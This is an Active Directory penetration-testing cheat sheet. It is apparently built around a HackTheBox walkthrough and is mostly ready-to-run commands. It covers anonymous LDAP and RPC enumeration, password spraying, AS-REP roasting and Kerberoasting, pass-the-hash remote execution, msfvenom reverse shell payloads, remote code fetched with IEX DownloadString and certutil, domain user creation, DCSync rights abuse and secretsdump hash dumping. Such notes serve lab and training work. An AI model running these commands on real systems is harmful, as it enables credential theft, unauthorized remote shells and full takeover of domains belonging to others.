
- smbclient - anonymous access
```
smbclient -L 
crackmapexec smb --shares

```

- DNS - leaking hostname
```
nslookup \
    server $IP
    127.0.0.1
    127.0.0.2
    hostname
    $IP
```

- LDAP [decent attack surface]
```
ldapsearch -h $IP
ldapsearch -h $IP -x # simple auth
ldapsearch -h $IP -x -s base namingcontexts # scope
ldapsearch -h $IP -x -b "DC=corporate,DC=local" > ldap.out
ldapsearch -h $IP -x -b "DC=htb,DC=local" '(ObjectClass=Person)' > people.out
ldapsearch -h $IP -x -b "DC=htb,DC=local" '(ObjectClass=Person)' | grep -i userPrincipalName | awk -F ':' '{print $2}' > useremailadds.ldap
ldapsearch -h $IP -x -b "DC=htb,DC=local" '(ObjectClass=Person)' | grep -i sAMAccountName: | awk -F ':' '{print $2}' > users.ldap
```

- rpcclient enum
```
rpcclient -U '' $IP --no-pass
    enumdomusers
    queryusergroups $username

```

- Password spray from LDAP / RPC findings
    - [simple pass.list](\wordlists\simple.txt)
```
# create password.list
for i in $(cat pass.list); do echo $i, echo $i2022, echo $i2021; echo $i!; done > tmp && cat tmp > pass.list
hashcat --force --stdout pass.list -r /usr/share/hashcat/rules/best64.rule | awk 'length {$0} > 8'
hashcat --force --stdout pass.list -r /usr/share/hashcat/rules/toggles1.rule | awk 'length {$0} > 8'
cat pass.list | sed '/^$/d' > tmp && cat tmp > pass.list

```

- crackmapexec password policy
    - enum4linux for groups, password policies etc
```
crackmapexec smb $IP -u "" -p "" --pass-pol # anonymous users in precompatiblity group in domains upgraded since 2003/2008
```

- crackmapexec bruteforce
```
crackmapexec smb $IP -u userlist -p passwordlist

```

- [kerbrute](https://github.com/TarlogicSecurity/kerbrute) bruteforce
```
python kerbrute.py -domain <domain_name> -users <users_file> -passwords <passwords_file> -outputfile <output_file>
```

- [Rubeus](https://github.com/Zer1t0/Rubeus) bruteforce
```
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```


- ASREPRoast with [impacket](https://github.com/SecureAuthCorp/impacket)
```
cp /usr/share/doc/python3-impacket/examples/GetNPUsers.py . # Users that do not require kerberos preauth
```

- hash cracking
```
hashcat -m 18200 -a 0 <AS_REP_responses_file> <passwords_file>

john --wordlist=<passwords_file> <AS_REP_responses_file>

```

- Kerberoast
```
# impacket
python GetUserSPNs.py <domain_name>/<domain_user>:<domain_user_password> -outputfile <output_TGSs_file>

# powershell
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat <TGSs_format [hashcat | john]> | % { $_.Hash } | Out-File -Encoding ASCII <output_TGSs_file>

# Rubeus

.\Rubeus.exe kerberoast /outfile:<output_TGSs_file>

```

- [Over pass the hash](https://www.hackingarticles.in/lateral-movement-over-pass-the-hash/)
```
# Request the TGT with hash
python getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>

# Request the TGT with aesKey (more secure encryption & stealth)
python getTGT.py <domain_name>/<user_name> -aesKey <aes_key>

# Request the TGT with password
python getTGT.py <domain_name>/<user_name>:[password]


# Set the TGT for impacket use
export KRB5CCNAME=<TGT_ccache_file>

# Execute remote commands with any of the following by using the TGT
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass

# OR with Rubeus and PSExec

# Ask and inject the ticket
.\Rubeus.exe asktgt /domain:<domain_name> /user:<user_name> /rc4:<ntlm_hash> /ptt

# Execute a cmd in the remote machine
.\PsExec.exe -accepteula \\<remote_hostname> cmd

```

Note: consider group policy password grabs and cracks GPPDecrypt / Powerup / Empire

- login with crackmapexec
```
crackmapexec smb $IP -u owned_user -p cracked_hash --shares
```

- login with evil-winrm (from nmap all ports -p 5985)

```
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
evil-winrm -u owned_user -p cracked_hash -i $IP 
```

- get standard revshell
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=443 -f exe -o reverse.exe # stageless
msfvenom -p windows/x64/reverse_tcp LHOST=$IP LPORT=443 -f exe -o reverse.exe # staged
```

- transfer options
    - python -m SimpleHTTPServer + certutil -urlcache -split -f 
    - upload via evil-winrm
    - impacket-smbserver sharename $(pwd) -smb2support -user me -password mypass
    - IEX(New-Object Net.WebClient).downloadString('http://$myIP/filetograb.ps1')

- on target machine powershell
```
$pass = convertto-securestring 'PASSWORD' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('user',$pass) # creates credential object on box
New-PSDrive -Name 'user' -PSProvider FileSystem -Credential $cred -Root \\$MyIP\Sharename
```


- priv esc steps
```
winPEAS.exe # unquoted paths, writable directories, unusual progs / services, interesting files, credentials, ninjacopy potentials
```
>  [bloodhound - for domain controllers](https://github.com/BloodHoundAD/BloodHound)
    - [SharpHound.exe](https://github.com/BloodHoundAD/SharpHound3)

```
locate neo4j | grep auth # delete to reset password
neo4j console # user:pass = neo4j:neo4j
# upload SharpHound and extract generated zip file - .\SharpHound.exe -c all --zipfilename hellothere.zip --encryptzip --stealth
# mark owner as owned
# show shortest path
# show path from owned principles
# nslookup any new domain objects found
# Any writedacl permissions / Account Operators / Group Permissions / account creation
# Exchange Server Group Permissions
```

> adding users for priv esc [if able via compromised account permissions]
```
net user d4nk0 hell0w0rld /add /domain
net group "Group to Add user to" /add d4nk0
net group "Group to add user to" /add owned_user
Add-DomainObjectAcl - Credential $cred -TargetIdentity 'DC=box,DC=domain' -PrincipleIdentity created_owned_user -Rights DCSync
```

> [Powersploit](https://github.com/PowerShellMafia/PowerSploit.git) - required for Add-DomainObjectAcl
```
git clone https://github.com/PowerShellMafia/PowerSploit.git -b dev # dev branch
powerview.ps1

```
> impacket - secretsdump.py # dumping hashes from box
```
./secretsdump.py box.domain/createduser:password@target_IP
# crack hashes
hashcat -m 1000 hash.dump /opt/wordlists/rockyou.txt -r rules/InsidePro-PasswordsPro.rule
```

> impacket - psexec
```
psexec.py admin@target_IP -hashes # blank LM hash
```








































Using LDAPSEARCH to extract information out of Active Directory

Dumping user information from AD via LDAP then creating a wordlist of users

Creating a custom wordlist for password spraying with some bashfu and hashcat

Using CrackMapExec to dump the password policy of Active Directory using a null authentication, then doing a Password Spray

 Enumerating information out of AD using rpcclient and null authentication

Now that our PWSpray is running in the background, lets go through Impacket Scripts to see what works.

Using GetNPUsers to perform an ASREP Roast (Kerberos PreAuth) with Null Authentication to extract SVC-ALFRESCO's hash.  Then Cracking it.

Using Evil-WinRM to get a shell on the box with SVC-ALFRESCO's credentials

Setting up a SMBShare, using New-PSDRive to mount the share, then running WinPEAS

Going over WinPEAS Output

Downloading Bloodhound and the SharpHound Ingestor

Importing the Bloodhound Results and finding an AD Attack Path

Going over the Account Operators Group (will allow us to create an account)

Using Net User to create a new user, then adding it to the Exchange Group

Downloading the PowerSploit Dev Branch to utilize the function "Add-DomainObjectAcl"

Some basic troubleshooting when the command goes wrong, then giving ippsec the DCSync Rights


Performing SecretsDump to perform a DCSync and extract hashes, then PSEXEC with Administrator to gain access

Going over the "--users" option in hashcat so you can easily identify whos hash was cracked

Using the KRBTGT Hash to perform the GoldenTicket attack from Linux

Showing it worked, Issues were we could not use IP Addresses anywhere in the command and need FQDN for the domain.  Create entries in Host file if DNS is not there.


##### enumerate users with rpcclient
```
rpcclient -U "" -N $IP
enumdomusers
```

##### AS-REP Roasting - attack against Kerberos for user accounts that do not require pre-authentication - dehash findings
```
GetNPUsers.py domain/ users.txt -format john -dc-ip $IP
john hash w=/usr/share/wordlists/rockyou.txt

```
##### connect using cracked hash
```
evil-winrm -i $IP -u username -p password
```

##### Create shell and connect with nc
```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=443 -f exe > shell.exe
certutil -urlcache -split -f http://$IP/shell.exe

```
 

##### Bloodhound
```
# download sharphound.ps1
https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors
https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1

# Transfer to shell
certutil -urlcache -split -f http://

Import-Module ./SharpHound.ps1
Invoke-Bloodhound -CollectionMethod All -Domain my.local -LDAPUser username -LDAPPass password
```

##### Find shortest route to admin - Exchange Server
```
Import-Module ./Powerview.ps1
Add-ADGroupMember -Identity "Exchange Trusted Subsystem" -Members svc-account-hacked

sudo python3 ntlmrelayx.py -t ldap://$IP --escalate-user svc-account-hacked



                                           
```







